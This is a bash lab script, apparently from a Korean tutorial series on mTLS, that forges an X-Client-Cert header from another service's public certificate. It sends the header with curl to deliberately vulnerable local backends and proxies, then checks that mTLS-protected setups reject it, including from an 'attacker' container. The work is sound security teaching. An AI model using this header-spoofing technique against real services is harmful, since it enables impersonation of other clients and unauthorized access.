#!/usr/bin/env bash
# 14·15편 ①: X-Client-Cert 헤더 위조. 인증서는 공개 정보라 "남의 인증서 PEM"은 누구나 가질 수 있다(개인키는 없어도).
set -uo pipefail
cd "$(dirname "$0")"; source env.sh
PY=../.venv/bin/python
ROOT=$PCA/root.crt
# orders 서비스의 "인증서"(공개키만 든 공개 정보)를 URL 인코딩해 헤더 값으로 만든다
FORGED=$($PY -c 'import sys,urllib.parse;print(urllib.parse.quote(open(sys.argv[1]).read(), safe=""))' $PCA/client.crt)
echo "위조 헤더 길이: ${#FORGED}자 (orders 인증서 PEM, 개인키 없음)"
c() { curl -s -w '  [HTTP %{http_code}]\n' "$@" 2>&1 || echo "  [curl 실패: exit $?]"; }

echo; echo "== 취약 ① 백엔드에 직접(127.0.0.1:18442), 위조 헤더"
c -H "X-Client-Cert: $FORGED" http://127.0.0.1:18442/orders
echo "== 취약 ② 헤더를 그대로 넘기는 프록시(18441), 클라이언트 인증서 없이 위조 헤더"
c --cacert $ROOT -H "X-Client-Cert: $FORGED" https://localhost:18441/orders
echo "== 취약 ②' 같은 프록시, 헤더 없이"
c --cacert $ROOT https://localhost:18441/orders

echo; echo "== 안전 ① mTLS 프록시(18440), 인증서 없이 위조 헤더"
c --cacert $ROOT -H "X-Client-Cert: $FORGED" https://localhost:18440/orders | grep -oE '<title>.*</title>|\[HTTP [0-9]+\]'
echo "== 안전 ② mTLS 프록시, payments 인증서로 접속 + orders 위조 헤더 (프록시가 덮어쓴다)"
c --cacert $ROOT --cert out/payments/chain.pem --key out/payments/client.key -H "X-Client-Cert: $FORGED" https://localhost:18440/orders
echo "== 안전 ③ 안전 백엔드는 호스트 포트가 없다"
docker port pki-lab-mtls-backend-safe; echo "  (열린 포트 없음)"
echo "== 안전 ④ 같은 내부망의 다른 컨테이너(10.31.0.99)에서 안전 백엔드로 직접, 위조 헤더"
docker run --rm --name pki-lab-mtls-attacker --network $NET --ip 10.31.0.99 -e H="$FORGED" $BACKEND_IMG python -c '
import os, urllib.request, urllib.error
req = urllib.request.Request("http://10.31.0.21:8080/orders", headers={"X-Client-Cert": os.environ["H"]})
try: r = urllib.request.urlopen(req); print(" ", r.read().decode().strip(), f"[HTTP {r.status}]")
except urllib.error.HTTPError as e: print(" ", e.read().decode().strip(), f"[HTTP {e.code}]")'
echo; echo "== 백엔드 로그"
docker logs pki-lab-mtls-backend-vuln 2>&1 | tail -3
docker logs pki-lab-mtls-backend-safe 2>&1 | tail -3
